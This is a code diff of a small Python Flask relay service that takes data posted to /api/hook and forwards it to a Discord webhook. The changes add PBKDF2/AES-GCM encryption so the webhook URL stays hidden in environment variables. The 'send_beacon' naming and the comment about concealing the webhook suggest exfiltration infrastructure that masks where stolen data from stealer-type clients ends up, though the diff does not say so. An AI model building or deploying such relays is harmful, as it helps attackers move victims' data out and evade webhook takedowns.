@@ -1,36 +1,53 @@
 import os
-import json
 import base64
+import json
 import requests
-from flask import Flask, request, jsonify
 from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-def decrypt(ciphertext: bytes, key: bytes) -> str:
-    cipher = AES.new(key, AES.MODE_GCM, nonce=ciphertext[:16])
-    return cipher.decrypt(ciphertext[16:]).decode()
+def derive_key(password: str, salt: bytes, length: int = 32) -> bytes:
+    return PBKDF2(password, salt, dkLen=length, count=100_000)
 
-def send_beacon(data: dict):
-    # replace with own discord webhook url and try to find out how to encrypt webhook url
-    webhook = "https://discord.com/api/webhooks/1234567890/ABC123"
-    requests.post(webhook, json=data)
+def decrypt(encrypted_blob: str, password: str) -> str:
+    data = base64.b64decode(encrypted_blob)
+    salt = data[:16]
+    nonce = data[16:28]
+    tag = data[-16:]
+    ct = data[28:-16]
+    key = derive_key(password, salt)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    try:
+        plaintext = cipher.decrypt_and_verify(ct, tag)
+        return plaintext.decode()
+    except Exception as e:
+        raise ValueError("Decryption failed – invalid key or corrupted data") from e
+
+WEBHOOK_BLOB = os.getenv("WEBHOOK_BLOB")
+WEBHOOK_KEY  = os.getenv("WEBHOOK_KEY")
+
+if not (WEBHOOK_BLOB and WEBHOOK_KEY):
+    raise RuntimeError("WEBHOOK_BLOB and WEBHOOK_KEY must be set in env")
+
+def send_to_discord(payload: dict):
+    webhook_url = decrypt(WEBHOOK_BLOB, WEBHOOK_KEY)
+    requests.post(webhook_url, json=payload)
 
 @app.route('/api/hook', methods=['POST'])
-def main():
+def endpoint():
     if request.method == "POST":
         body = request.get_json()
         if not body or "data" not in body:
             return jsonify({"error": "Invalid payload"}), 400
-        encrypted = base64.b64decode(body["data"])
-        key = os.getenv("CRYPTO_KEY").encode()  # Set in Vercel env as base64-encoded 32-byte key
         try:
-            payload = decrypt(encrypted, key)
-            send_beacon({"content": payload})
-        except Exception as e:
-            return jsonify({"error": str(e)}), 500
+            webhook_url = decrypt(WEBHOOK_BLOB, WEBHOOK_KEY)
+            requests.post(webhook_url, json=body)
+        except Exception as exc:
+            return jsonify({"error": str(exc)}), 500
     return jsonify({"status": "ok"})
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host="0.0.0.0", port=port)
